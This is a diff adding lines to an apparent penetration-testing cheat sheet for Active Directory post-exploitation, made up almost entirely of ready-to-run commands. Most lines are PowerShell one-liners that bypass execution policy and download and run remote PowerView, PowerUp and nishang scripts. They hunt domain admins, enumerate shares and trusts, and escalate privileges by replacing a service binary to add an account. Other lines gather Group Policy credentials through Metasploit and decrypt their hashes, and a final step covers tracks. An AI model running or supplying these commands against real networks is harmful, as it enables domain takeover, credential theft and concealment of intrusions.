@@ -146,3 +146,49 @@ Get list of all computers in AD
 
 Collection of information by systems, registries and  other info
 - powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/Information.ps1');Get-Information
+
+Search network for which computers the Domain Admins are using
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Get-Userhunter
+
+Find out which computer a specific AD user is on.
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Invoke-UserHunter -Username=domainuser"
+
+Find open shares
+- powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess | Out-File -Encoding ascii found_shares.txt
+
+(very loud)
+powershell.exe -NoP -NonI -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Invoke-NetView
+
+powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/nishang/master/Gather/Get-Information.ps1');Get-Information
+
+other non powershell post exploitation commands
+- wmic useraccount get /ALL /format:csv
+- nltest /DCLIST:[domain]
+- net group "Domain Admins" /domain
+- net localgroup administrators /DOMAIN
+
+Domain Trusts
+- powershell.exe -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Invoke-MapDomainTrusts | Export-CSV -NoTypeInformation trusts.csv
+
+- powershell.exe -NoP -NonI -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerView/powerview.ps1');Invoke-GetLocalGroup -HostName machinename
+
+
+metasploit module
+ - use post/windows/gather/credentials/gpp
+ - set session [session #]
+ - exploit
+
+- mount \\[Domain Controller]\SYSVOL\[Domain]\Policies and look for Groups.xml and decrypt hash using  http://esec-pentest.sogeti.com/public/files/gpprefdecrypt.py
+
+Privilege Escalation
+
+Powerup
+- powershell.exe -version 2 -NoP -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1');Invoke-AllChecks
+- use  icals on the vulnerable service.
+- powershell.exe -version 2 -NoP -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerTools/master/PowerUp/PowerUp.ps1'); Write-ServiceEXE -ServiceName vulerableservice -Username newaccount -Password password -Verbose
+- restart the service or if no permission, reboot or wait for reboot.
+
+Removing Tracks
+- powershell.exe -version 2-NoP -ExecBypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Veil-Framework/PowerTools/master/PowerUp/PowerUp.ps1');Restore-ServiceEXE -Servicename vulnerableservice
+
+
